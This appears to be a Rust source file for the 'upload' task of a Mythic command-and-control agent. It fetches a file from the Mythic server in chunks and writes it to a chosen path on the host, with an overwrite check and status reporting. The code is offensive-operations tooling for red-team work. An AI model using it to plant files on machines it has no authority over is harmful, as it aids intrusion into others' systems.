use crate::structs::{GetFileFromMythicStruct, Task};
use serde::Deserialize;
use tokio::sync::mpsc;

#[derive(Deserialize)]
struct UploadArgs {
    file_id: String,
    remote_path: String,
    #[serde(default)]
    overwrite: bool,
}

pub async fn execute(task: Task) {
    let mut response = task.new_response();

    let args: UploadArgs = match serde_json::from_str(&task.data.params) {
        Ok(a) => a,
        Err(e) => {
            response.set_error(&format!("Failed to parse parameters: {}", e));
            let _ = task.job.send_responses.send(response).await;
            let _ = task.remove_running_task.send(task.data.task_id.clone()).await;
            return;
        }
    };

    // Check if file exists and overwrite not set
    if !args.overwrite && tokio::fs::metadata(&args.remote_path).await.is_ok() {
        response.set_error("File already exists. Set overwrite to true.");
        let _ = task.job.send_responses.send(response).await;
        let _ = task.remove_running_task.send(task.data.task_id.clone()).await;
        return;
    }

    let (chunk_tx, mut chunk_rx) = mpsc::channel::<Vec<u8>>(10);

    let get_msg = GetFileFromMythicStruct {
        task_id: task.data.task_id.clone(),
        full_path: args.remote_path.clone(),
        file_id: args.file_id.clone(),
        send_user_status_updates: true,
        received_chunk_channel: chunk_tx,
        tracking_uuid: String::new(),
        send_responses: task.job.send_responses.clone(),
        file_transfers: task.job.file_transfers.clone(),
    };

    if task.job.get_file_from_mythic.send(get_msg).await.is_err() {
        response.set_error("Failed to request file from Mythic");
        let _ = task.job.send_responses.send(response).await;
        let _ = task.remove_running_task.send(task.data.task_id.clone()).await;
        return;
    }

    // Collect chunks
    let mut file_data = Vec::new();
    while let Some(chunk) = chunk_rx.recv().await {
        file_data.extend_from_slice(&chunk);
    }

    // Write to disk
    match tokio::fs::write(&args.remote_path, &file_data).await {
        Ok(_) => {
            response.user_output = format!(
                "Uploaded {} bytes to {}",
                file_data.len(),
                args.remote_path
            );
            response.completed = true;
        }
        Err(e) => response.set_error(&format!("Failed to write file: {}", e)),
    }

    let _ = task.job.send_responses.send(response).await;
    let _ = task.remove_running_task.send(task.data.task_id.clone()).await;
}
